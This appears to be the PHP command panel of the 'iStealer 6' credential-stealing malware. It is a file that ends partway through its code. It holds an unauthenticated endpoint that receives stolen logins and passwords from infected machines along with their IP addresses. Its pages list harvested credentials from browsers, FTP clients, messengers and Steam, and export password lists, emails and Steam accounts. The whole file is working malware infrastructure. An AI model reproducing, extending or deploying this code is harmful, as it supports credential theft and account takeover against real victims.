<?php
require("config.php");
 
 
 
// logs total / new logs
 
$mysql = connect_database();
$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
if (!$result) {
					$result = mysql_query("CREATE TABLE `logs` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `program` INT NOT NULL, `url` 
								VARCHAR(150) NOT NULL, `login` VARCHAR(50) NOT NULL, `pass` VARCHAR(50) NOT NULL, `computer` VARCHAR(50) NOT NULL, `date` 
								DATETIME NOT NULL, `ip` VARCHAR(15) NOT NULL);", $mysql);
					if (!$result) {
						$html .= "Database Error".$header."Can not create table 'logs', please check the configuration and your priviledges.".$footer;
						die($html);
					}
				}
else {
$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
$logstotal = mysql_result($result, 0);
}
mysql_close($mysql);
 
$handle = fopen("lognum.txt","r") or die("Cant open lognum.txt");
$oldnum = fread($handle, "99999") or die("Can't read lognum.txt");
fclose($handle);
 
if ($logstotal > $oldnum) {
	$newlogs = $logstotal - $oldnum;
	$handle = fopen("lognum.txt","w") or die("Cant open lognum.txt");
	$oldnum = fwrite($handle,$logstotal) or die("Can't write lognum.txt");
	fclose($handle);
}
 
else {
	$newlogs = "No";
}
 
	
 
//// Titles /////////////////////
 
if ($_GET["action"] == "logs" || !isset($_GET["action"])) {
	$mtitle ="Logs";
	$mtxt = " Results ".($_SESSION["page"]*$logspage)." - ".(($_SESSION["page"]*$logspage)+$logspage)." of  ".$logstotal;
}
 
if ($_GET["action"] == "search" || !isset($_GET["action"])) {
	$mtitle ="Search";
	$mtxt = "";
}
 
if ($_GET["action"] == "logs-cftp" || !isset($_GET["action"])) {
	$mtitle ="CuteFTP Logs";
	$mtxt = "Showing CuteFTP logs";
}
 
if ($_GET["action"] == "logs-ddns" || !isset($_GET["action"])) {
	$mtitle ="DynDNS Logs";
	$mtxt = "Showing DynDNS logs";
}
 
if ($_GET["action"] == "logs-filezilla" || !isset($_GET["action"])) {
	$mtitle ="FileZilla Logs";
	$mtxt = "Showing FileZilla logs";
}
 
if ($_GET["action"] == "logs-firefox" || !isset($_GET["action"])) {
	$mtitle ="Firefox Logs";
	$mtxt = "Showing Firefox logs";
}
 
if ($_GET["action"] == "logs-ffxp" || !isset($_GET["action"])) {
	$mtitle ="FlashFXP Logs";
	$mtxt = "Showing FlashFXP logs";
}
 
if ($_GET["action"] == "logs-chrome" || !isset($_GET["action"])) {
	$mtitle ="Google Chrome Logs";
	$mtxt = "Showing Google Chrome logs";
}
 
if ($_GET["action"] == "logs-gtalk" || !isset($_GET["action"])) {
	$mtitle ="Google Talk Logs";
	$mtxt = "Showing Google Talk logs";
}
 
if ($_GET["action"] == "logs-idm" || !isset($_GET["action"])) {
	$mtitle ="IDM Logs";
	$mtxt = "Showing IDM logs";
}
 
if ($_GET["action"] == "logs-ie" || !isset($_GET["action"])) {
	$mtitle ="Internet Explorer Logs";
	$mtxt = "Showing Internet Explorer logs";
}
 
if ($_GET["action"] == "logs-msn" || !isset($_GET["action"])) {
	$mtitle ="MSN Logs";
	$mtxt = "Showing MSN logs";
}
 
if ($_GET["action"] == "logs-noip" || !isset($_GET["action"])) {
	$mtitle ="No-Ip Logs";
	$mtxt = "Showing No-Ip logs";
}
 
if ($_GET["action"] == "logs-opera" || !isset($_GET["action"])) {
	$mtitle ="Opera Logs";
	$mtxt = "Showing Opera logs";
}
 
if ($_GET["action"] == "logs-pal" || !isset($_GET["action"])) {
	$mtitle ="Paltalk Logs";
	$mtxt = "Showing Paltalk logs";
}
 
if ($_GET["action"] == "logs-pid" || !isset($_GET["action"])) {
	$mtitle ="Pidgin/Gaim Logs";
	$mtxt = "Showing Pidgin/Gaim logs";
}
 
if ($_GET["action"] == "logs-smart" || !isset($_GET["action"])) {
	$mtitle ="Smart FTP Logs";
	$mtxt = "Showing Smart FTP logs";
}
 
if ($_GET["action"] == "logs-steam" || !isset($_GET["action"])) {
	$mtitle ="Steam Logs";
	$mtxt = "Showing Steam logs";
}
 
if ($_GET["action"] == "logs-trillaim" || !isset($_GET["action"])) {
	$mtitle ="Trillian / AIM Logs";
	$mtxt = "Showing Trillian / Aim logs";
}
 
if ($_GET["action"] == "logs-trillmsn" || !isset($_GET["action"])) {
	$mtitle ="Trillian / MSN Logs";
	$mtxt = "Showing Trillian / MSN logs";
}
 
if ($_GET["action"] == "logs-trillyahoo" || !isset($_GET["action"])) {
	$mtitle ="Trillian / Yahoo Logs";
	$mtxt = "Showing Trillian / Yahoo logs";
}
 
 
if ($_GET["action"] == "list-browsers" || !isset($_GET["action"])) {
	$mtitle ="Browsers";
	$mtxt = "Showing Browsers Logs";
}
 
if ($_GET["action"] == "list-ftp" || !isset($_GET["action"])) {
	$mtitle ="FTP";
	$mtxt = "Showing FTP Logs";
}
 
if ($_GET["action"] == "list-dns" || !isset($_GET["action"])) {
	$mtitle ="DNS";
	$mtxt = "Showing DNS Logs";
}
 
if ($_GET["action"] == "list-im" || !isset($_GET["action"])) {
	$mtitle ="Instant Messengers";
	$mtxt = "Showing Instant Messengers Logs";
}
 
if ($_GET["action"] == "remnull" || !isset($_GET["action"])) {
	$mtitle ="";
	$mtxt = "Removing Null Logs";
}
 
///// Template //////////////
 
	$html       = "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 

'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'> 
<html xmlns='http://www.w3.org/1999/xhtml'><head><title>iStealer 6 MOD Nulled By rundll32 and radar</title>";
	$header     = "<link rel='shortcut icon' type='image/ico' href='images/favicon.ico' /><link href='css/reset.css' rel='stylesheet' type='text/css' media='all' /><link href='css/stylesheet.css' rel='stylesheet' type='text/css' media='all' /><link href='css/css3.css' rel='stylesheet' type='text/css' media='all' /><!--[if lte IE 6]><link href='css/ie.css' rel='stylesheet' type='text/css' media='screen' /><![endif]--></head><body> 
	<div id='head'> 
	<!-- logo --> 
	<h1 id='logo'><a href='?action=logs'>Logo</a></h1> 
	
    <!-- top menu --> 
    <ul id='navigation'> 
		<li><a href='#' style='color:#FFF;'>".$newlogs." New Logs</a></li> 
        <li><a href='?action=logs'>Main</a></li> 
        <li><a href='?action=search'>Search</a></li> 
        <li><a href='?action=logout'>Logout</a></li> 
		<li><a href='http://www.fagex.net'>Fagex.net</a></li> 
    </ul> 
</div> 
 
 
<!-- start: side column --> 
<div id='side'> 
	<div id='welcome-block'> 
		<span>Welcome <a href='#'>".$username."</a><br>You have ".$newlogs." new logs</span> 
	</div> 
	
	<!-- sub menus --> 
	<div id='sub-menu'> 
		<h3 class='selected'><a href='#'>Main Menu</a></h3> 
		<ul> 
			<li><a href='?action=logs'>Main</a></li> 
			<li><a href='?action=search'>Search</a></li> 
			<li><a href='?action=remnull'>Remove 'null' logs </a></li> 
			<li><a href='?action=logout'>Logout</a></li> 
		</ul> 
		
		<h3><a href='#'>List Applications</a></h3> 
		<ul> 
			<li><a href='?action=logs'>List All</a></li> 
			<li><a href='?action=logs-cftp'>List CuteFTP</a></li> 
			<li><a href='?action=logs-ddns'>List DynDNS</a></li> 
			<li><a href='?action=logs-filezilla'>List Filezilla</a></li> 
			<li><a href='?action=logs-firefox'>List Firefox</a></li> 
			<li><a href='?action=logs-ffxp'>List FlashFXP</a></li> 
			<li><a href='?action=logs-chrome'>List Google Chrome</a></li> 
			<li><a href='?action=logs-gtalk'>List Google Talk</a></li> 
			<li><a href='?action=logs-idm'>List IDM</a></li> 
			<li><a href='?action=logs-ie'>List Internet Explorer</a></li> 
			<li><a href='?action=logs-msn'>List MSN</a></li> 
			<li><a href='?action=logs-noip'>List No-Ip</a></li> 
			<li><a href='?action=logs-opera'>List Opera</a></li> 
			<li><a href='?action=logs-pal'>List Paltalk Scene</a></li> 
			<li><a href='?action=logs-pid'>List Pidgin/Gaim</a></li> 
			<li><a href='?action=logs-smart'>List SmartFTP</a></li> 
			<li><a href='?action=logs-steam'>List Steam</a></li> 
			<li><a href='?action=logs-trillaim'>List Trillian / AIM</a></li> 
			<li><a href='?action=logs-trillmsn'>List Trillian / MSN</a></li> 
			<li><a href='?action=logs-trillyahoo'>List Trillian / Yahoo</a></li> 
		</ul> 
		
		<h3><a href='#'>List Types</a></h3> 
		<ul> 
			<li><a href='?action=list-browsers'>Browsers</a></li> 
			<li><a href='?action=list-dns'>DNS</a></li> 
			<li><a href='?action=list-ftp'>FTP</a></li> 
			<li><a href='?action=list-im'>Instant Messengers</a></li> 
		</ul> 
		
		<h3><a href='#'>Export Logs</a></h3> 
		<ul> 
			<li><a href='?action=exportall'>Export All</a></li> 
			<li><a href='?action=export-browsers'>Export Browsers</a></li> 
			<li><a href='?action=export-dns'>Export DNS</a></li> 
			<li><a href='?action=emails'>Export Emails</a></li> 
			<li><a href='?action=export-ftp'>Export FTP</a></li> 
			<li><a href='?action=ips'>Export IP's</a></li> 
			<li><a href='?action=export-im'>Export Instant Messengers</a></li> 
			<li><a href='?action=pws'>Export Password List</a></li> 
			<li><a href='?action=steams'>Export Steam Accounts</a></li> 
		</ul> 
	</div> 
	
 
<!-- end: side column --> 
</div> 
 
<!-- start: content --> 
 
 
<div id='content'> 
<!-- page corner --> 
	<div class='corner'></div> 
 
	<h1>".$mtitle."</h1> 
	
	<div class='divider'></div> 
	<div class='kubrick'> 
	<div class='top'> 
			<h3>".$mtxt."</h3> 
			
        	
			<div class='clear'></div> 
		</div> 
		
		<div class='wrap'> 
";
	$footer     = "</div></div></div><div id='footer'> 
		<span>iStealer 6 MOD Nulled By rundll32 and radar - <a href='#'>top</a></span> 
	</div>";
	$searchform = "<form name='search' method='POST' action='?action=search'> 
				Search for: <input class='text medium' type='text' name='q' size='20'> In: <select name='in' class='text medium'> 
				<option selected='selected' value='1'>Url</option><option value='2'>Login</option> 
				<option value='3'>Password</option><option value='4'>Computer</option> 
				<option value='5'>Date</option><option value='6'>Ip</option></select> 
				<input type='submit' class='button def' value='Search' name='search'></form>";
	$loginform  = "<form id='loginform' name='frm' method='POST' action='?action=login'> 
				<table id='logintable' cellpadding='0' cellspacing='10' border='0'> 
				<tr><td>Username:</td><td><input type='text' class='text medium' name='username' size='20'></td></tr> 
				<tr><td>Password:</td><td><input type='password' class='text medium' name='password' size='20'></td></tr> 
				<tr><td></td><td><input type='submit' value='Login' class='button def' name='login'></td></tr></form>";
	$javascript  = "<script language='javascript' type='text/javascript'> 
				function checkAll() { chk = document.getElementsByName('sel[]');
				for (i = 0; i<chk.length; i++) { if (document.frm.elements['check_all'].checked) chk[i].checked = true; else chk[i].checked = false;}}
				function checkform() { chk = document.getElementsByName('sel[]'); for (i = 0; i<chk.length; i++) { if (chk[i].checked == true) { 
				return true;}} alert('At least one option must be select.'); return false; }
				function confirmation() { return confirm('Are you sure you want to delete all selected logs?');}</script> 
				<script type='text/javascript' src='js/jquery-1.4.2.min.js'></script> 
				<script type='text/javascript' src='js/jquery.idTabs.min.js'></script> 
				<script type='text/javascript' src='js/global.js'></script>";
	$aplications = array("MSN Messenger", "Google talk", "Trillian/MSN", "Trillian/AIM", "Trillian/Yahoo", "Pidgin/Gaim", "Paltalk Scene", "Steam",
					"No-Ip" , "DynDNS", "Firefox", "Internet Explorer", "Google Chrome", "Opera", "IDM", "FileZilla", "FlashFXP", "SmartFtp", "CuteFtp");
	$cols        = array("program", "url", "login", "pass", "computer", "date", "ip");
 
	// FUNCTIONS ******************************************************************************
	function connect_database() {
		global $dbHost, $dbUser, $dbPass, $dbDatabase, $html, $header, $footer;
		$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
		if (!$mysql) {
			$html .= "Database Error".$header."Can not connect to database, please check the configuration.".$footer;
			die($html);
		}
		if (!mysql_select_db($dbDatabase, $mysql)) {
			mysql_close($mysql);
			$html .= "Database Error".$header."Can not select '".$dbDatabase."' database, please check the configuration.".$footer;
			die($html);
		}
		return $mysql;
	}
	function pages_number($logstotal, $logspage) {
		$pagesnumber = ceil($logstotal/$logspage);
		$temp = "Pages: ";
		for ($i=0; $i<$pagesnumber; $i++) {
			if ($_SESSION["page"] == $i)
				$temp .= " <span class='page1'>".$i."</span>";
			else
				$temp .= " <span class='page0'><a href='?action=logs&page=".$i."'>".$i."</a></span>";
		}
		$temp .= " Results ".($_SESSION["page"]*$logspage)." - ".(($_SESSION["page"]*$logspage)+$logspage)." of ".$logstotal;
		return $temp;
	}
	function sort_order() {
		if ($_SESSION["order"] == 0) $tmp = "ASC"; else $tmp = "DESC";
			return $tmp;
	}
 
	// TEST *************************************************************************************
	if ($_GET["action"] == "test") {
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
		if ($result) {
			echo "Ready";
		} else {
			echo "NoReady";
		}
		mysql_close($mysql);
		exit;
	}
 
	// ADD ***************************************************************************************
	if ($_GET["action"] == "add") {
		if (isset($_GET["a"]) && isset($_GET["c"]) && isset($_GET["u"]) && isset($_GET["l"])&& isset($_GET["p"]) 
		&& is_numeric($_GET["a"]) && $_GET["a"]>=0 && $_GET["a"]<=18 && strlen($_GET["p"])>3) {
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) exit;
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '".$_GET["a"]."' AND `url` = '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["u"])), $mysql).
			"' AND `login` = '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["l"])), $mysql)."' AND `pass` = '".
			mysql_real_escape_string(htmlspecialchars(urldecode($_GET["p"])), $mysql)."';", $mysql);
			if (!$result) exit;
			if (mysql_num_rows($result) == 0) {
				$result = mysql_query("INSERT INTO `logs` (`id`, `program`, `url`, `login`, `pass`, `computer`, `date`, `ip`) VALUES (NULL , '".
				$_GET["a"]."', '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["u"])), $mysql)."', '".
				mysql_real_escape_string(htmlspecialchars(urldecode($_GET["l"])), $mysql)."', '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["p"])), $mysql)."', '".
				mysql_real_escape_string(htmlspecialchars(urldecode($_GET["c"])), $mysql)."', '".date("Y-m-d H:i:s")."', '".$_SERVER['REMOTE_ADDR']."');", $mysql);
			}
			mysql_close($mysql);
		}
		exit;
	}
 
	// LOGIN **************************************************************************************
	session_start();
	
	if ($_SESSION["user"]!=$username || $_SESSION["ip"]!=$_SERVER["REMOTE_ADDR"]) {
		if ($_GET["action"] == "login") {
			if (isset($_POST["username"]) && isset($_POST["password"]) && $username==$_POST["username"] && $password==$_POST["password"]) {
				session_start();
				$_SESSION["user"] = $username;
				$_SESSION["ip"] = $_SERVER["REMOTE_ADDR"];
				$_SESSION["sort"] = 5;
				$_SESSION["order"] = 1;
				$_SESSION["page"] = 0;
				
				$here = "1";
$currdomain = getenv("HTTP_HOST");
				
				$mysql = connect_database();
				$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
				if (!$result) {
					$result = mysql_query("CREATE TABLE `logs` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `program` INT NOT NULL, `url` 
								VARCHAR(150) NOT NULL, `login` VARCHAR(50) NOT NULL, `pass` VARCHAR(50) NOT NULL, `computer` VARCHAR(50) NOT NULL, `date` 
								DATETIME NOT NULL, `ip` VARCHAR(15) NOT NULL);", $mysql);
					if (!$result) {
						$html .= "Database Error".$header."Can not create table 'logs', please check the configuration and your priviledges.".$footer;
						die($html);
					}
				}
				mysql_close($mysql);
				header("Location: ?action=logs");
			} else {
				$html = "<html><head><title>Login Error</title><link rel='stylesheet' type='text/css' href='css/stylesheet.css'/></head><body>".$loginform."</body></html>";
				echo $html;
				exit;
			}
		} else {
			$html = "<html><head><title>Login</title><link rel='stylesheet' type='text/css' href='css/stylesheet.css'/></head><body>".$loginform."</body></html>";
			echo $html;
			exit;
		}
	}
 
	// LOGOUT ************************************************************************************
	if ($_GET["action"] == "logout") {
		unset($_SESSION["user"]);
		unset($_SESSION["ip"]);
		unset($_SESSION["sort"]);
		unset($_SESSION["order"]);
		unset($_SESSION["page"]);
		session_unset();
		header("Location: index.php");
 
	// LOGS **************************************************************************************
	} elseif ($_GET["action"] == "logs" || !isset($_GET["action"])) {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form><p>&nbsp;</p>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS CuteFTP **************************************************************************************
	} elseif ($_GET["action"] == "logs-cftp") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '18';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '18' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS DynDNS **************************************************************************************
	} elseif ($_GET["action"] == "logs-ddns") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '9';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '9' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS Filezilla **************************************************************************************
	} elseif ($_GET["action"] == "logs-filezilla") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '15';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '15' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS Firefox **************************************************************************************
	} elseif ($_GET["action"] == "logs-firefox") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
				if ($_SESSION["order"] == 0) $_SESSION["order"] = 1; else $_SESSION["order"] = 0; else $_SESSION["sort"] = $_GET["sort"];
		}
 
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) FROM `logs` WHERE `program` = '10';", $mysql);
		$logstotal = mysql_result($result, 0);
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/$logspage))
				$_SESSION["page"] = $_GET["page"];
			
			$result = mysql_query("SELECT * FROM `logs` WHERE `program` = '10' ORDER BY `".$cols[$_SESSION["sort"]]."` ".sort_order()." LIMIT ".($logspage*$_SESSION["page"])." , ".$logspage.";", $mysql);
			if (!$result) die(mysql_error());
			
			
			
			$html .= $header.$javascript."
					<form name='frm' method='POST' action='?action=selected' onsubmit='return checkform();'><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div></div> 
					<table id='logstable' cellpadding='0' cellspacing='0' border='0'><tr id='row0'> 
					<th><a href='?action=logs&sort=0'>Program</a></th><th><a href='?action=logs&sort=1'>Url / Host</a></th> 
					<th><a href='?action=logs&sort=2'>Login</a></th><th><a href='?action=logs&sort=3'>Password</a></th> 
					<th><a href='?action=logs&sort=4'>Computer</a></th><th><a href='?action=logs&sort=5'>Date</a></th> 
					<th><a href='?action=logs&sort=6'>Ip</a></th> 
					<th><input type='checkbox' name='check_all' onClick='checkAll();'></th></tr>";
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$html .= "<tr class='";

				if ($i % 2 == 0) $html .= "row1"; else $html .= "row2";

				$html .= "'><td>".$aplications[$row["program"]]."</td>";
				$html .= "<td><a href='".$row["url"]."' target='_blanc'>".$row["url"]."</a></td><td>".$row["login"]."</td><td>".$row["pass"]."</td>";
				$html .= "<td>".$row["computer"]."</td><td>".$row["date"]."</td><td>".$row["ip"]."</td>";
				$html .= "<td><input type='checkbox' name='sel[]' value='".$row["id"]."'></td></tr>";
				$i++;
			}
			$html .= "</table><div id='pages'><div id='numbers'>".pages_number($logstotal, $logspage)."</div><div id='buttons'><input name='buttonact' class='button def' 

			type='submit' value='Copy Selected'> <input name='buttonact' class='button def' type='submit' value='Export Selected'> <input name='buttonact' class='button def' type='submit' 

			value='Delete Selected' onclick='if (!confirmation()) return false;'></div></div></form>".$footer;
		} else {
			$html .= $header."No logs found!".$footer;
		}
		mysql_close($mysql);
		
		echo $html;
		
		// LOGS FlashFXP **************************************************************************************
	} elseif ($_GET["action"] == "logs-ffxp") {
		
	
		if (isset($_GET["sort"]) && $_GET["sort"]>=0 && $_GET["sort"]<=6) {
			if ($_SESSION["sort"] == $_GET["sort"])
